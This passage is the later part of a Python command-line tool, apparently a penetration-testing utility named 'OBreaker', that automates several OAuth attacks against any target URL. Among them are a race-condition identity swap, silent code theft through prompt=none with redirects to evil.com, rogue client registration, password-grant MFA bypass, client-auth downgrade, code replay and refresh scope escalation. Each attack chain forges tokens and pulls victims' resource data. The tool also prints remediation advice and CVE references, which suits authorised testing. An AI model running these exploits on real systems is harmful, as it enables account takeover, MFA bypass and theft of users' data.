            if "singleton" in body.lower() or "race" in body.lower() or "overwritten" in body.lower():
                race_detected = True
                sample_result = r
                break

        if not race_detected:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="5 concurrent authorization requests (simulating victim + attacker)",
            result=f"RACE DETECTED: shared singleton verifier state overwritten",
            request="GET /race x5 concurrent",
            response=sample_result.get("body", "")[:200],
        ))

        # FORGE: exchange one user's code with another's verifier (cross-verifier)
        codes = [(r.get("user"), r.get("code"), r.get("verifier")) for r in results if r.get("code")]
        if len(codes) >= 2:
            victim_user, victim_code, _ = codes[0]
            attacker_user, _, attacker_verifier = codes[1]

            # Exchange victim's code with attacker's verifier (race condition allows this)
            token, claims, _ = self._exchange_code(victim_code, attacker_verifier)
            chain.append(ExploitStep(
                phase="FORGE",
                action=f"Exchange user{victim_user}'s code with user{attacker_user}'s verifier (cross-user)",
                result=f"Token obtained: sub={claims.get('sub')}" if token else "Exchange rejected",
                request=f"POST /token code=<user{victim_user}> verifier=<user{attacker_user}>",
                response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
                success=bool(token),
            ))

            if token:
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE",
                    action="Access resources with cross-verifier token (identity confusion)",
                    result=f"IDENTITY SWAP: accessing as {api_data.get('email')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200],
                    success=api_ok,
                ))
                return Finding(
                    technique="OAuth Singleton Race Condition", severity="critical",
                    title="Identity swap via race condition -- attacker exchanges victim's code",
                    description=(
                        "Shared singleton verifier state. Concurrent flows overwrite each other's verifiers. "
                        "Attacker times their flow to overwrite victim's verifier, then exchanges "
                        "victim's code with attacker's verifier."
                    ),
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "IDENTITY SWAP: Race condition lets attacker's verifier overwrite victim's. "
                        "Attacker exchanges victim's code, obtains victim's token, "
                        "accesses victim's resources."),
                    remediation="Use per-request isolated session state, never shared singletons.",
                    cves=["GHSA-9q5m-jfc4-wc92"],
                )

        return Finding(
            technique="OAuth Singleton Race Condition", severity="critical",
            title="Race condition in shared verifier state -- identity swap possible",
            description="Concurrent flows overwrite shared state. Cross-user verifier exchange possible.",
            chain=chain, remediation="Use per-request isolated state.",
            cves=["GHSA-9q5m-jfc4-wc92", "GHSA-2cjm-2gwv-m892"],
        )

    # ── 11. prompt=none Silent Redirect ─────────────────────────────
    def test_prompt_none(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/prompt-none"
        chain = []
        evil_uri = "https://evil.com/steal"

        params, v = auth_params(self.cfg, prompt="none", redirect_uri=evil_uri)
        try:
            r = self._get(url, params=params)
        except Exception:
            return None

        # Extract stolen code from evil redirect
        stolen_code = ""
        try:
            data = r.json()
            loc = data.get("location", "")
            uri_validated = data.get("redirect_uri_validated", True)
            note = data.get("note", "")
            if evil_uri in loc and "code=" in loc:
                parsed = urllib.parse.urlparse(loc)
                qs = urllib.parse.parse_qs(parsed.query)
                stolen_code = qs.get("code", [""])[0]
        except Exception:
            return None

        if not stolen_code:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"prompt=none with redirect_uri={evil_uri}",
            result=f"Code SILENTLY delivered to attacker: {loc[:120]}",
            request=f"GET /prompt-none?prompt=none&redirect_uri={evil_uri}",
            response=f"redirect_uri_validated={uri_validated}, location={loc[:100]}",
        ))

        # FORGE
        token, claims, _ = self._exchange_code(stolen_code, v)
        chain.append(ExploitStep(
            phase="FORGE",
            action="Exchange silently-stolen code for access token",
            result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}" if token else "Failed",
            request=f"POST /token code={stolen_code[:20]}...",
            response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
            success=bool(token),
        ))

        if not token:
            return Finding(technique="prompt=none Silent Redirect", severity="high",
                title="Silent code theft via prompt=none",
                description=f"Code delivered to {evil_uri} without user interaction.",
                chain=chain, remediation="Validate redirect_uri before processing prompt=none.")

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access victim's resources with silently-stolen token",
            result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="prompt=none Silent Redirect", severity="critical" if api_ok else "high",
            title="Silent account takeover via prompt=none + open redirect",
            description=(
                "With prompt=none, the AS silently redirects (with auth code) to an "
                "unregistered redirect_uri. No user interaction required. "
                "Attacker embeds invisible iframe/img pointing to the authorization URL, "
                "victim's code is silently delivered to attacker's server."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "SILENT TAKEOVER: No user interaction. Attacker's hidden iframe triggers "
                "prompt=none, code silently delivered to evil server, exchanged for token, "
                "victim's resources accessed."),
            remediation="Validate redirect_uri BEFORE processing prompt=none. RFC 9700 S4.11.2.",
        )

    # ── 12. DCR Open Registration ───────────────────────────────────
    def test_dcr_open(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/register"
        chain = []

        payload = {
            "redirect_uris": ["https://evil.com/cb"],
            "client_name": "OBreaker Rogue Client",
            "grant_types": ["authorization_code"],
            "token_endpoint_auth_method": "none",
        }

        try:
            r = self._post(url, json=payload)
        except Exception:
            return None

        if r.status_code in (200, 201):
            try:
                data = r.json()
                rogue_cid = data.get("client_id", "")
                if rogue_cid:
                    chain.append(ExploitStep(
                        phase="FIND",
                        action="Unauthenticated Dynamic Client Registration",
                        result=f"Rogue client registered: {rogue_cid}",
                        request=f"POST /register {json.dumps(payload)[:100]}",
                        response=f"client_id={rogue_cid}",
                    ))
                    chain.append(ExploitStep(
                        phase="FORGE",
                        action="Rogue client with attacker redirect_uri registered",
                        result="Attacker can now phish users via legitimate OAuth consent screen",
                        request=f"client_id={rogue_cid}, redirect_uris=[https://evil.com/cb]",
                        response="Phishing via consent: victim sees legitimate provider login, code goes to evil.com",
                    ))
                    chain.append(ExploitStep(
                        phase="FIRE",
                        action="Phish victim via rogue client -> steal code -> exchange -> access resources",
                        result="Complete phishing chain available via legitimate consent flow",
                    ))
                    return Finding(
                        technique="DCR Open Registration", severity="critical",
                        title="Unauthenticated client registration -- phishing via consent screen",
                        description=(
                            "Anyone can register OAuth clients. Attacker registers client with their "
                            "redirect_uri, victim sees legitimate consent screen, approves, "
                            "code delivered to attacker."
                        ),
                        chain=chain,
                        proof=ExploitProof(impact="PHISHING: Rogue client enables credential theft via legitimate consent flow."),
                        remediation="Require authentication for DCR.",
                        cves=["CVE-2026-22752"],
                    )
            except Exception:
                pass

        if r.status_code == 401:
            discovered_via = "Discovered via .well-known" if self.cfg.openid_config.get("registration_endpoint") else ""
            chain.append(ExploitStep(
                phase="FIND",
                action="DCR endpoint exists and is reachable",
                result=f"401 (auth required). {discovered_via}",
                request=f"POST {url}",
                response=f"{r.status_code}: {r.text[:100]}",
            ))
            return Finding(
                technique="DCR Open Registration", severity="medium",
                title="DCR endpoint exposed (auth required but discoverable)",
                description="Registration endpoint exists. Weak or leaked initial_access_tokens enable registration.",
                chain=chain, remediation="Remove from discovery if unused. Strong auth + rate-limit.",
            )
        return None

    # ── 13. Grant Type Substitution -> MFA Bypass ───────────────────
    def test_grant_type_substitution(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/token/mfa"
        chain = []

        data = {
            "grant_type": "password",
            "username": "victim@example.com",
            "password": "STOLEN_PASSWORD",
            "client_id": self.cfg.client_id or "test_client",
            "scope": "openid",
        }

        try:
            r = self._post(url, data=data)
        except Exception:
            if "password" in self.cfg.grant_types:
                return Finding(technique="Grant Type Substitution -> MFA Bypass", severity="high",
                    title="Password grant enabled (MFA bypass risk)", chain=[],
                    description="password grant in discovery.", remediation="Disable password grant.",
                    cves=["CVE-2024-37893"])
            return None

        if r.status_code != 200 and "access_token" not in r.text:
            return None

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Attempted password grant (bypasses browser-bound MFA)",
            result=f"PASSWORD GRANT ACCEPTED: MFA bypassed. {note}",
            request=f"POST /token/mfa grant_type=password username=victim@example.com",
            response=f"access_token issued, sub={claims.get('sub')}",
        ))

        chain.append(ExploitStep(
            phase="FORGE",
            action="Token obtained via non-MFA grant type",
            result=f"JWT: sub={claims.get('sub')}, scope={claims.get('scope')}",
            request="(token already obtained in FIND step via password grant)",
            response=f"Claims: {json.dumps(claims)[:200]}",
        ))

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access MFA-protected resources with MFA-bypassed token",
            result=f"RESOURCE ACCESSED as {api_data.get('email')} -- MFA BYPASSED" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="Grant Type Substitution -> MFA Bypass", severity="critical",
            title="MFA completely bypassed via password grant -- full account access",
            description=(
                "MFA is only enforced on the browser (authorization_code) flow. "
                "The password grant type (ROPC) accepts username+password and returns "
                "a token WITHOUT triggering MFA. An attacker with stolen credentials "
                "bypasses ALL MFA protections."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                f"MFA BYPASS: Password grant skipped MFA. Attacker authenticated as "
                f"{claims.get('sub')} without MFA, accessed all protected resources."),
            remediation="Enforce MFA across ALL grant types, or disable password grant entirely.",
            cves=["CVE-2024-37893"],
        )

    # ── 14. Auth Method Confusion ───────────────────────────────────
    def test_auth_method_confusion(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/token/authmethod"
        chain = []

        cid = self.cfg.client_id or "test_client"
        creds = base64.b64encode(f"{cid}:secret".encode()).decode()
        data = {
            "grant_type": "authorization_code",
            "code": secrets.token_hex(8),
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
        }

        try:
            r = self._post(url, data=data, headers={"Authorization": f"Basic {creds}"})
        except Exception:
            return None

        if r.status_code != 200 and "access_token" not in r.text:
            return None

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Sent Basic auth to endpoint registered for private_key_jwt",
            result=f"DOWNGRADE ACCEPTED: {note}",
            request=f"POST /token/authmethod Authorization: Basic {creds[:20]}...",
            response=f"Token issued despite wrong auth method",
        ))

        chain.append(ExploitStep(
            phase="FORGE",
            action="Exchanged code with weak auth method (Basic instead of private_key_jwt)",
            result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}",
            request="(downgrade already succeeded -- Basic auth accepted)",
            response=f"JWT claims: {json.dumps(claims)[:150]}",
        ))

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access resources with token from downgraded auth",
            result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="Auth Method Confusion", severity="critical" if api_ok else "high",
            title="Client auth downgrade -- private_key_jwt bypassed with Basic auth",
            description=(
                "Client registered with strong auth (private_key_jwt) but token endpoint "
                "silently falls back to client_secret_basic. Attacker who knows/guesses "
                "the client_secret bypasses strong client authentication entirely."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "AUTH DOWNGRADE: Strong client auth (private_key_jwt) bypassed by sending "
                "Basic auth. Attacker exchanges codes without proper client verification, "
                "accesses protected resources."),
            remediation="Strictly enforce registered token_endpoint_auth_method. Reject fallbacks.",
            cves=["Spring Security #9780", "MCP TypeScript SDK #951"],
        )

    # ── 15. Code Replay ─────────────────────────────────────────────
    def test_code_replay(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/token/replay"
        chain = []

        v = pkce_verifier()
        code = "replay_test_code"
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "client_id": self.cfg.client_id or "test_client",
            "code_verifier": v,
        }

        try:
            r1 = self._post(url, data=data)
            r2 = self._post(url, data=data)
        except Exception:
            return None

        t1_ok = r1.status_code == 200 and "access_token" in r1.text
        t2_ok = r2.status_code == 200 and "access_token" in r2.text

        if not (t1_ok and t2_ok):
            return None

        try:
            token1 = r1.json().get("access_token", "")
            token2 = r2.json().get("access_token", "")
            claims1 = decode_jwt(token1)
            claims2 = decode_jwt(token2)
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Exchanged same auth code TWICE",
            result=f"BOTH exchanges returned valid tokens (code not single-use)",
            request=f"POST /token/replay code={code} x2",
            response=f"1st: token (sub={claims1.get('sub')}), 2nd: token (sub={claims2.get('sub')})",
        ))

        chain.append(ExploitStep(
            phase="FORGE",
            action="Attacker replays intercepted code after victim already used it",
            result=f"SECOND TOKEN: sub={claims2.get('sub')}, scope={claims2.get('scope')}",
            request="POST /token/replay (replayed same code)",
            response=f"JWT: {json.dumps(claims2)[:150]}",
        ))

        # FIRE: both tokens work
        api1, ok1 = self._access_api(token1)
        api2, ok2 = self._access_api(token2)
        chain.append(ExploitStep(
            phase="FIRE",
            action="BOTH tokens access protected resources simultaneously",
            result=(
                f"Token 1 (victim): {api1.get('email')} ({api1.get('role')})\n"
                f"Token 2 (attacker replay): {api2.get('email')} ({api2.get('role')})"
            ) if ok1 and ok2 else "Partial access",
            request="GET /api with token1 AND token2",
            response=f"Both return 200 with user data",
            success=ok1 and ok2,
        ))

        return Finding(
            technique="Code Replay", severity="critical" if ok2 else "high",
            title="Auth code reuse -- attacker and victim both get valid tokens",
            description=(
                "Same auth code accepted for multiple exchanges (RFC 6749 S4.1.2 violation). "
                "Attacker intercepts code, victim exchanges it, attacker ALSO exchanges "
                "the same code. Both get valid tokens. Two active sessions for the same user."
            ),
            chain=chain,
            proof=self._build_proof(token2, claims2, api2, ok2,
                "CODE REPLAY: Same code exchanged twice, both tokens valid. "
                "Attacker has parallel session accessing victim's resources."),
            remediation="Invalidate codes after first use. Revoke ALL tokens if replay detected.",
        )

    # ── 16. Scope Creep at Refresh ──────────────────────────────────
    def test_scope_creep(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/token/scope"
        chain = []

        # Step 1: show initial limited scope
        chain.append(ExploitStep(
            phase="FIND",
            action="User initially authorized with scope=openid read (limited)",
            result="Initial token has read-only access",
            request="(initial authorization with limited scope)",
            response="scope=openid read",
        ))

        # Step 2: refresh with escalated scope
        data = {
            "grant_type": "refresh_token",
            "refresh_token": "test_refresh_token",
            "client_id": self.cfg.client_id or "test_client",
            "scope": "openid read write admin",
        }

        try:
            r = self._post(url, data=data)
        except Exception:
            return None

        if r.status_code != 200 and "access_token" not in r.text:
            return None

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            new_scope = resp.get("scope", "")
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        if "admin" not in new_scope and "admin" not in claims.get("scope", ""):
            return None

        chain.append(ExploitStep(
            phase="FORGE",
            action="Refresh token with ESCALATED scope (read -> admin)",
            result=f"SCOPE ESCALATED: {new_scope}. {note}",
            request="POST /token/scope grant_type=refresh_token scope=openid read write admin",
            response=f"New scope: {new_scope}, JWT scope: {claims.get('scope')}",
        ))

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access resources with admin-escalated token (was read-only)",
            result=f"ADMIN ACCESS as {api_data.get('email')}, role={api_data.get('role')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="Scope Creep at Refresh", severity="critical",
            title="Privilege escalation: read-only to admin via refresh scope expansion",
            description=(
                "Refresh endpoint issues tokens with broader scope than originally granted. "
                "User authorized read-only access. Attacker (or malicious app) refreshes "
                "with scope=admin. Server grants it -- no ceiling check. "
                "RFC 6749 S6 is silent on scope expansion, enabling privilege escalation."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                f"PRIVILEGE ESCALATION: Started with read-only, escalated to '{new_scope}' via refresh. "
                f"Attacker now has admin access to all resources."),
            remediation="Reject refresh requests with scope broader than original grant.",
            cves=["CVE-2025-12110", "CVE-2026-1035"],
        )

    # ── 17. Resource Indicator Omission ─────────────────────────────
    def test_resource_indicator(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/token/resource"
        chain = []

        v = pkce_verifier()
        data = {
            "grant_type": "authorization_code",
            "code": secrets.token_hex(8),
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "client_id": self.cfg.client_id or "test_client",
            "code_verifier": v,
        }

        try:
            r = self._post(url, data=data)
        except Exception:
            return None

        if r.status_code != 200 and "access_token" not in r.text:
            return None

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            aud_present = resp.get("aud_present", True)
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        if aud_present and "aud" in claims and "ignored" not in note.lower() and "unbound" not in note.lower():
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Token exchange WITHOUT resource parameter (RFC 8707)",
            result=f"AUDIENCE-UNBOUND TOKEN: aud_present={aud_present}, aud={claims.get('aud', 'MISSING')}. {note}",
            request="POST /token/resource (no resource parameter)",
            response=f"aud_present={aud_present}, token aud={claims.get('aud', 'MISSING')}",
        ))

        # FORGE: this token works ANYWHERE (no audience binding)
        chain.append(ExploitStep(
            phase="FORGE",
            action="Audience-unbound token can be presented to ANY resource server",
            result=f"Token has no aud restriction -- universal replay possible",
            request="(token already obtained -- no audience binding)",
            response=f"JWT: {json.dumps(claims)[:150]}",
        ))

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Replay audience-unbound token against /api (any resource server)",
            result=f"UNIVERSAL REPLAY: {api_data.get('email')}'s data accessed" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="Resource Indicator Omission", severity="critical" if api_ok else "high",
            title="Universal token replay -- no audience binding (RFC 8707 ignored)",
            description=(
                "Resource parameter (RFC 8707) is ignored. Token has no audience binding. "
                "A token obtained from any client/flow can be replayed against any resource "
                "server in the ecosystem. Critical in MCP/multi-API architectures."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "UNIVERSAL REPLAY: Token has no audience. Attacker obtains token from any "
                "trusted client, replays it against any API in the ecosystem."),
            remediation="Require resource parameter per RFC 8707. Bind tokens to specific audiences.",
        )

    # ── Run ─────────────────────────────────────────────────────────
    TECHNIQUES = [
        ("Response Mode Escape",                "test_response_mode_escape"),
        ("Missing State",                       "test_missing_state"),
        ("Static State",                        "test_static_state"),
        ("Predictable State",                   "test_predictable_state"),
        ("S256->plain Downgrade",               "test_pkce_plain_downgrade"),
        ("No Verifier Check",                   "test_no_verifier"),
        ("No Challenge Check",                  "test_no_challenge"),
        ("Confidential Client Downgrade",       "test_confidential_downgrade"),
        ("Missing aud Validation",              "test_missing_aud"),
        ("OAuth Singleton Race Condition",      "test_race_condition"),
        ("prompt=none Silent Redirect",         "test_prompt_none"),
        ("DCR Open Registration",               "test_dcr_open"),
        ("Grant Type Substitution -> MFA Bypass", "test_grant_type_substitution"),
        ("Auth Method Confusion",               "test_auth_method_confusion"),
        ("Code Replay",                         "test_code_replay"),
        ("Scope Creep at Refresh",              "test_scope_creep"),
        ("Resource Indicator Omission",         "test_resource_indicator"),
    ]

    def run_all(self) -> list[Finding]:
        print(f"\n{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v2.0 -- OAuth Exploit Tool        |{C.RESET}")
        print(f"{C.CYAN}{C.BOLD}  |  Find - Forge - Fire (Full Exploitation)    |{C.RESET}")
        print(f"{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
        print(f"\n  {C.DIM}Target: {self.cfg.base_url}{C.RESET}")
        print(f"  {C.DIM}Client: {self.cfg.client_id or 'auto-detect'}{C.RESET}")
        print(f"  {C.DIM}API:    {self.cfg.api_endpoint}{C.RESET}")
        print(f"  {C.DIM}Techniques: {len(self.TECHNIQUES)}{C.RESET}\n")

        for name, method_name in self.TECHNIQUES:
            sys.stdout.write(f"  {C.YELLOW}[~]{C.RESET} {name}...")
            sys.stdout.flush()
            try:
                finding = getattr(self, method_name)()
                if finding:
                    self.findings.append(finding)
                    sev_color = {"critical": C.RED, "high": C.RED, "medium": C.YELLOW,
                                 "low": C.CYAN}.get(finding.severity, C.RESET)
                    exploited = " [EXPLOITED]" if finding.proof.resource_accessed else ""
                    print(f"\r  {C.GREEN}[+]{C.RESET} {name} -- "
                          f"{sev_color}{finding.severity.upper()}{C.RESET}{C.RED}{exploited}{C.RESET}")
                else:
                    print(f"\r  {C.DIM}[-]{C.RESET} {name} -- not vulnerable")
            except Exception as e:
                print(f"\r  {C.RED}[!]{C.RESET} {name} -- error: {e}")

        return self.findings

    def run_single(self, key: str) -> Optional[Finding]:
        key_map = {
            "response-mode": "test_response_mode_escape",
            "missing-state": "test_missing_state",
            "static-state": "test_static_state",
            "predictable-state": "test_predictable_state",
            "pkce-plain": "test_pkce_plain_downgrade",
            "no-verifier": "test_no_verifier",
            "no-challenge": "test_no_challenge",
            "confidential": "test_confidential_downgrade",
            "aud-validation": "test_missing_aud",
            "race": "test_race_condition",
            "prompt-none": "test_prompt_none",
            "dcr": "test_dcr_open",
            "mfa-bypass": "test_grant_type_substitution",
            "auth-method": "test_auth_method_confusion",
            "code-replay": "test_code_replay",
            "scope-creep": "test_scope_creep",
            "resource": "test_resource_indicator",
        }
        method_name = key_map.get(key)
        if not method_name:
            print(f"  {C.RED}[!]{C.RESET} Unknown: {key}")
            print(f"  Available: {', '.join(key_map.keys())}")
            return None
        return getattr(self, method_name)()


# ── Report ──────────────────────────────────────────────────────────

def print_report(findings: list[Finding]):
    if not findings:
        print(f"\n  {C.GREEN}{C.BOLD}No vulnerabilities found.{C.RESET}\n")
        return

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: sev_order.get(f.severity, 5))

    exploited = sum(1 for f in findings if f.proof.resource_accessed)
    print(f"\n{C.BOLD}{'='*70}")
    print(f"  EXPLOIT REPORT: {len(findings)} vulnerabilities, {exploited} fully exploited")
    print(f"{'='*70}{C.RESET}\n")

    for i, f in enumerate(findings, 1):
        sev_color = {"critical": C.RED, "high": C.RED, "medium": C.YELLOW,
                     "low": C.CYAN}.get(f.severity, C.RESET)

        tag = f" {C.RED}[EXPLOITED]{C.RESET}" if f.proof.resource_accessed else ""
        print(f"  {C.BOLD}[{i}] {f.technique}{tag}{C.RESET}")
        print(f"  {sev_color}Severity: {f.severity.upper()}{C.RESET}")
        print(f"  {f.title}\n")

        # Attack chain
        if f.chain:
            print(f"  {C.CYAN}{C.BOLD}ATTACK CHAIN:{C.RESET}")
            for j, step in enumerate(f.chain, 1):
                phase_color = {"FIND": C.YELLOW, "FORGE": C.MAGENTA, "FIRE": C.RED}.get(step.phase, C.RESET)
                status = C.GREEN + "OK" + C.RESET if step.success else C.RED + "FAIL" + C.RESET
                print(f"    {phase_color}{step.phase}{C.RESET} {C.DIM}Step {j}{C.RESET} [{status}]")
                print(f"      Action: {step.action}")
                print(f"      Result: {step.result}")
                if step.request:
                    print(f"      {C.DIM}Req: {step.request[:100]}{C.RESET}")
                if step.response:
                    print(f"      {C.DIM}Res: {step.response[:100]}{C.RESET}")
            print()

        # Proof
        if f.proof.resource_accessed:
            print(f"  {C.RED}{C.BOLD}PROOF OF EXPLOITATION:{C.RESET}")
            if f.proof.identity_obtained:
                print(f"    Identity obtained: {C.RED}{f.proof.identity_obtained}{C.RESET}")
            if f.proof.jwt_claims:
                print(f"    JWT Claims: {C.WHITE}{json.dumps(f.proof.jwt_claims)[:200]}{C.RESET}")
            if f.proof.resource_data:
                print(f"    Resource Data: {C.WHITE}{json.dumps(f.proof.resource_data)[:200]}{C.RESET}")
            print(f"    {C.RED}{C.BOLD}Impact: {f.proof.impact}{C.RESET}")
            print()
        elif f.proof.impact:
            print(f"  {C.YELLOW}Impact: {f.proof.impact}{C.RESET}\n")

        if f.cves:
            print(f"  {C.MAGENTA}CVEs: {', '.join(f.cves)}{C.RESET}")
        print(f"  {C.GREEN}Fix: {f.remediation}{C.RESET}")
        print(f"  {C.DIM}{'- '*35}{C.RESET}\n")

    crits = sum(1 for f in findings if f.severity == "critical")
    highs = sum(1 for f in findings if f.severity == "high")
    meds = sum(1 for f in findings if f.severity == "medium")
    print(f"  {C.BOLD}Summary:{C.RESET} {C.RED}{crits} Critical{C.RESET}, "
          f"{C.RED}{highs} High{C.RESET}, {C.YELLOW}{meds} Medium{C.RESET}")
    print(f"  {C.BOLD}Exploited:{C.RESET} {C.RED}{exploited}/{len(findings)} vulnerabilities fully exploited "
          f"with resource access proof{C.RESET}\n")


def save_json_report(findings: list[Finding], path: str):
    data = []
    for f in findings:
        entry = {
            "technique": f.technique, "severity": f.severity, "title": f.title,
            "description": f.description, "remediation": f.remediation, "cves": f.cves,
            "attack_chain": [
                {"phase": s.phase, "action": s.action, "result": s.result,
                 "request": s.request, "response": s.response, "success": s.success}
                for s in f.chain
            ],
            "proof": {
                "exploited": f.proof.resource_accessed,
                "identity_obtained": f.proof.identity_obtained,
                "jwt_claims": f.proof.jwt_claims,
                "resource_data": f.proof.resource_data,
                "impact": f.proof.impact,
                "token": f.proof.token[:80] + "..." if len(f.proof.token) > 80 else f.proof.token,
            },
        }
        data.append(entry)
    with open(path, "w") as fp:
        json.dump(data, fp, indent=2)
    print(f"\n  {C.GREEN}[+]{C.RESET} JSON report: {path}")


def main():
    parser = argparse.ArgumentParser(description="OBreaker v2.0 -- OAuth Exploit Tool")
    parser.add_argument("--target", "-t", required=True, help="OAuth base URL")
    parser.add_argument("--technique", "-T", help="Run single technique by key")
    parser.add_argument("--all", "-a", action="store_true", help="Run all 17 techniques")
    parser.add_argument("--client-id", "-c", help="OAuth client_id")
    parser.add_argument("--redirect-uri", "-r", help="OAuth redirect_uri")
    parser.add_argument("--json", "-j", help="Save JSON exploit report")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--discover", "-d", action="store_true", help="Only run discovery")
    args = parser.parse_args()

    session = make_session()

    print(f"\n  {C.CYAN}[*]{C.RESET} Discovering OAuth configuration...")
    config = discover_oauth(args.target, session)

    if args.client_id:
        config.client_id = args.client_id
    if args.redirect_uri:
        config.redirect_uri = args.redirect_uri

    if not config.client_id:
        try:
            r = session.get(f"{args.target.rstrip('/')}/login", timeout=10)
            m = re.search(r'client_id=([^&"]+)', r.text)
            if m:
                config.client_id = m.group(1)
                print(f"  {C.GREEN}[+]{C.RESET} Auto-detected client_id: {config.client_id}")
        except Exception:
            pass
    if not config.redirect_uri:
        config.redirect_uri = f"{args.target.rstrip('/')}/cb"

    if args.discover:
        print(f"\n  {C.BOLD}OAuth Configuration:{C.RESET}")
        for label, val in [
            ("Base URL", config.base_url), ("Authorize", config.authorize_endpoint),
            ("Token", config.token_endpoint), ("Register", config.register_endpoint),
            ("API", config.api_endpoint), ("Client ID", config.client_id),
            ("Redirect", config.redirect_uri), ("Grant Types", config.grant_types),
        ]:
            print(f"    {label:12}: {val or 'not found'}")
        return

    breaker = OAuthBreaker(config, session, verbose=args.verbose)

    if args.all:
        findings = breaker.run_all()
    elif args.technique:
        finding = breaker.run_single(args.technique)
        findings = [finding] if finding else []
    else:
        print(f"  {C.YELLOW}[!]{C.RESET} Specify --all or --technique <key>")
        return

    print_report(findings)
    if args.json:
        save_json_report(findings, args.json)


if __name__ == "__main__":
    main()
